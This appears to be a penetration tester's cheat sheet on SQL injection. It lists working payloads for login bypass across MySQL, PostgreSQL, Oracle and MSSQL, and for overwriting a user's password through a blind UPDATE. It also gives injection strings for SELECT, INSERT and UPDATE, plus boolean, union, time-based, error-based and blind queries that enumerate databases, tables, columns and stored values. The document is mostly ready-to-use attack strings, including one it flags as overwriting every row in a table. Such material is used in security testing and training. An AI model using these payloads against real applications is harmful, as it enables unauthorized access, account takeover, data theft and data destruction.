# SQL injection

## Simple login bypass

#### MySQL

```
' or 1=1;#
' or 1=1 LIMIT 1;#
```

#### PostgreSQL

```
' or 1=1;--
' or 1=1;/*
' or 1=1 LIMIT 1;--
```

#### Oracle

```
' or 1=1--
' or 1=1 LIMIT 1--
```

#### MSSQL

```
' or 1=1--
```

## Login bypass by blind update

This technique requires you to know the table and column name of the password field. Once discovered we attempt to update the value of the password with an arbitrary one and then log in as the user. In case of stored password hashes we have to guess the correct hash format.

#### Update and verify execution

Execute an update statement and then verify its execution by running a select query on the new value. If the application hangs for the specified time then the update is successful and we have writing rights

```
'; update <table> set <col> = '<str>' where username = '<user>'; IF ((select count(*) from <table> where <col>='<str>')=1) WAITFOR DELAY '0:0:10';--
```

#### Convert string to hash

If the db stores the passwords as hashes we have to guess the hash type. We can use the following commands to generate hash strings to use with the update statement

```
echo -n '<pass>' | md5sum
echo -n '<pass>' | sha1sum
echo -n '<pass>' | sha256sum
```

## Injection types

### SELECT

```
SELECT * FROM accounts WHERE user = 'xxx' AND pass = 'yyy'

xxx' OR 1=1;--            #hides the condition on pass field behind a comment
xxx' OR 1=1 LIMIT 1;--    #hides the extra quote with a comment and limits the results to 1 match (can avoid simple SQLi detections)
```

### INSERT

```
INSERT INTO accounts (user, pass, info) VALUES ('xxx', 'yyy', 'zzz');

xxx');<commands>;--    #close the open sets of quotes and brackets, hide the duplicates behind inline comment
```

### UPDATE

```
UPDATE accounts SET info='xxx' WHERE user = 'yyy';

xxx';<commands>;--    #DANGEROUS! Hides the WHERE clause, all info fields in table will be set to "xxx"
yyy';<commands>;--    #update statement completes normally, then the injected commands will be executed
```

## Techniques

### Boolean based

Execute a query containing a valid parameter (such as an item ID) and concatenate to the instruction a comparison statement that will always be true or false.

```
<param>' and 1=1;    #returns the item matching <param>
<param>' and 1=0;    #returns nothing
<param>' or 1=1      #returns everything
```

If the first statement returns the expected value and the second statement returns nothing then the field or parameter are vulnerable

#### Payload variants

```
' and 'a'='a    #strings instead of numbers, note the missing quote at the end
' and "a"="a    #double quotes instead of single, note the missing quote at the end
') and 1=1;     #closed round bracket to exclude other conditions
') and 'a'='a'; #version with string comparison
```

### Union based

1. Find the number of columns: `' or 1=1 order by <col number>; --` increase the number of columns until you get an error. Pay also attention to how the output is ordered, this allows you to match a column number to its output field.
2. Join data: `' or 1=1 union all select <fields> from <table>; --` since the UNION operation requires that both tables have the same column number, add NULL values for the missing columns in the select if the operation fails.

### Time based

Execute a query that results in a boolean statement (true/false). Use a time delay command to stop execution if the result is True. Useful to display boolean values since error based data disclosure doesn't work with them.

```
');if (IS_MEMBER ('db_owner') = 0) WAITFOR DELAY '0:0:5';--
```

This technique can also be used to verity the existence of an SQL injection vulnerability in the same way as the Boolean attack. If the application freezes for the given amount of time after executing the query then the field or parameter are vulnerable

```
<value>'; WAITFOR DELAY '0:0:5'; --
```

### Error based

If the field you're injecting is not used to display data it is possible to make the database print data by causing a cast error i.e. casting strings to integers. This allows you to read one value in a table at time, to print more values filter by row number.

```
'); select CAST(@@version as int);--
```

#### Print database list

```
');SELECT CAST (name AS integer) FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS rownumber,name FROM master..sysdatabases) AS foo WHERE rownumber = <row>;--
```

#### Print tables in database

```
');SELECT CAST (name AS integer) FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS rownumber,name FROM <db>..sysobjects WHERE xtype = 'U') AS foo WHERE rownumber = <row>;--
```

#### Enumerate columns

```
');SELECT CAST (foo.name AS integer) FROM (SELECT ROW_NUMBER() OVER (ORDER BY archive..syscolumns.name ASC) AS rownumber,<db>..syscolumns.name AS name FROM <db>..syscolumns, <db>..sysobjects WHERE <db>..syscolumns.id=<db>..sysobjects.id AND <db>..sysobjects.name='<table>') AS foo WHERE rownumber = <row>;--
```

#### Select data from column in nth row

Insert the columns you need to read in the inner select, in this way it wil be possible to select by row number and read the content of the column one row at time.

```
');SELECT CAST (foo.col1 AS integer) FROM (SELECT ROW_NUMBER() OVER (ORDER BY id ASC) AS rownumber,<db>..<table>.<column> AS col1 FROM <db>..<table>) AS foo WHERE rownumber = <nth>;--
```

### Blind queries

Allows to retrieve information about the db structure and its contents by querying the db using boolean statements such as "does this table exists?" in combination with an error or time based query. In this way we can verify the result of query by checking if an error is returned or the execution is paused by the given time.

Time based queries are your best bet because error strings may be intercepted by error control mechanisms on the backend while sleep instructions are executed as standard SQL instructions.

These examples are written in MSSQL format with time based queries but can be easily converted in any SQL dialect.

#### Generic query

```
'; IF (<statement>) <wait or error instruction>;--
```

#### Check if table exists

```
'; IF ((select count(name) from sys.tables where name = '<table>')=1) WAITFOR DELAY '0:0:10';--
```

#### Check if column exists

```
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = '<table>' and c.name = '<column>')=1) WAITFOR DELAY '0:0:10';--
```

#### Check if value exists

```
'; IF ((select count(<column>) from <table> where <column> = '<value>')=1) WAITFOR DELAY '0:0:10';--
```

#### Guess values

It is possible to discover a given value by using the like condition to check one character at time until we find the complete string. For example to find the user table we proceed as follows

```
'; IF ((select count(name) from sys.tables where name like 'u%')=1) ...
'; IF ((select count(name) from sys.tables where name like 'us%')=1) ...
'; IF ((select count(name) from sys.tables where name like 'use%')=1) ...
'; IF ((select count(name) from sys.tables where name like 'user%')=1) ...
```

This technique can be applied to any object in the database including tables, column names and values
